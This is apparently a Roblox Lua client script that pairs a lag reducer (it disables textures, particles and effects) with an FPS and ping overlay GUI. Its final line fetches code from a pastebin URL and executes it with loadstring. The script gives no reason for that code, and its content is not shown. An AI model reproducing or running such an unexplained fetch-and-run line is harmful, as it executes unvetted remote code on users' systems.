--------------------------------------------------------------------
------------------------[ LAG REDUCER SCRIPT ]-----------------------
local ToDisable = {
	Textures = true,
	VisualEffects = true,
	Parts = true,
	Particles = true,
	Sky = true
}
local ToEnable = { FullBright = false }
local Stuff = {}

for _, v in next, game:GetDescendants() do
	if ToDisable.Parts and (v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart")) then
		v.Material = Enum.Material.SmoothPlastic
		table.insert(Stuff, v)
	end
	if ToDisable.Particles and (v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire")) then
		v.Enabled = false
		table.insert(Stuff, v)
	end
	if ToDisable.VisualEffects and (v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect")) then
		v.Enabled = false
		table.insert(Stuff, v)
	end
	if ToDisable.Textures and (v:IsA("Decal") or v:IsA("Texture")) then
		v.Texture = ""
		table.insert(Stuff, v)
	end
	if ToDisable.Sky and v:IsA("Sky") then
		v.Parent = nil
		table.insert(Stuff, v)
	end
end

game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled "..#Stuff.." assets / effects.")

if ToEnable.FullBright then
    local Lighting = game:GetService("Lighting")
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    Lighting.FogEnd = math.huge
    Lighting.FogStart = math.huge
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 5
    Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
    Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    Lighting.Outlines = true
end

--------------------------------------------------------------------
--------------------------[ FPS + PING GUI KÍNH ]--------------------
--// Dynamic Island Hover + Soft Shadow — by PhanGiaHuy x GPT-5 🍎
local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

--== GUI setup ==
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "DynamicIslandHover"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

--== Soft shadow frame ==
local shadow = Instance.new("Frame", gui)
shadow.AnchorPoint = Vector2.new(0.5, 0)
shadow.Position = UDim2.new(0.5, 0, 0.02, 6)
shadow.Size = UDim2.new(0, 90, 0, 24)
shadow.BackgroundTransparency = 1

local shadowGradient = Instance.new("UIGradient", shadow)
shadowGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
shadowGradient.Transparency = NumberSequence.new{
	NumberSequenceKeypoint.new(0, 0.85),
	NumberSequenceKeypoint.new(0.4, 0.95),
	NumberSequenceKeypoint.new(1, 1)
}
shadowGradient.Rotation = 90

local shadowCorner = Instance.new("UICorner", shadow)
shadowCorner.CornerRadius = UDim.new(1, 0)

--== Main Island ==
local island = Instance.new("Frame", gui)
island.AnchorPoint = Vector2.new(0.5, 0)
island.Position = UDim2.new(0.5, 0, 0.02, 0)
island.Size = UDim2.new(0, 80, 0, 18)
island.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
island.BackgroundTransparency = 0.5
island.BorderSizePixel = 0
island.ClipsDescendants = true
island.ZIndex = 2

local corner = Instance.new("UICorner", island)
corner.CornerRadius = UDim.new(1, 0)

--== Inner glass ==
local glass = Instance.new("Frame", island)
glass.Size = UDim2.new(1, 0, 1, 0)
glass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
glass.BackgroundTransparency = 0.3
glass.BorderSizePixel = 0
local gcorner = Instance.new("UICorner", glass)
gcorner.CornerRadius = UDim.new(1, 0)
local ggrad = Instance.new("UIGradient", glass)
ggrad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 230, 230)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200))
}
ggrad.Rotation = 45

--== Border stroke ==
local stroke = Instance.new("UIStroke", island)
stroke.Thickness = 1.2
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Transparency = 0.6
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

--== Text ==
local label = Instance.new("TextLabel", island)
label.Size = UDim2.new(1, -20, 1, 0)
label.Position = UDim2.new(0, 10, 0, 0)
label.BackgroundTransparency = 1
label.Text = "Ping: ... | FPS: ..."
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextStrokeTransparency = 0.3
label.TextSize = 22
label.Font = Enum.Font.GothamBold
label.TextTransparency = 1
label.ZIndex = 3

local glow = label:Clone()
glow.Parent = island
glow.TextTransparency = 1
glow.TextStrokeTransparency = 1
glow.ZIndex = 2

--== FPS + Ping ==
local fps, ping = 0, 0
RunService.RenderStepped:Connect(function() fps += 1 end)

task.spawn(function()
	while task.wait(1) do
		local ok, _ = pcall(function()
			ping = math.floor(player:GetNetworkPing() * 1000)
		end)
		label.Text = "Ping: "..ping.." ms | FPS: "..fps
		glow.Text = label.Text
		fps = 0
	end
end)

--== Hover anim ==
local hovering = false
local function showIsland()
	if hovering then return end
	hovering = true
	TweenService:Create(island, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 230, 0, 48),
		BackgroundTransparency = 0.1
	}):Play()
	TweenService:Create(glass, TweenInfo.new(0.4), {BackgroundTransparency = 0.7}):Play()
	TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
	TweenService:Create(glow, TweenInfo.new(0.3), {TextTransparency = 0.5}):Play()
	TweenService:Create(shadow, TweenInfo.new(0.4), {Size = UDim2.new(0, 240, 0, 50)}):Play()
end

local function hideIsland()
	if not hovering then return end
	hovering = false
	TweenService:Create(island, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 80, 0, 18),
		BackgroundTransparency = 0.5
	}):Play()
	TweenService:Create(glass, TweenInfo.new(0.4), {BackgroundTransparency = 0.3}):Play()
	TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
	TweenService:Create(glow, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
	TweenService:Create(shadow, TweenInfo.new(0.4), {Size = UDim2.new(0, 90, 0, 24)}):Play()
end

--== Hover detection ==
local mouse = player:GetMouse()
RunService.Heartbeat:Connect(function()
	local pos = Vector2.new(mouse.X, mouse.Y)
	local guiPos = island.AbsolutePosition
	local guiSize = island.AbsoluteSize
	local center = guiPos + guiSize / 2
	local dist = (pos - center).Magnitude
	if dist < 120 then showIsland() else hideIsland() end
end)
--------------------------------------------------------------------
loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
--------------------------------------------------------------------

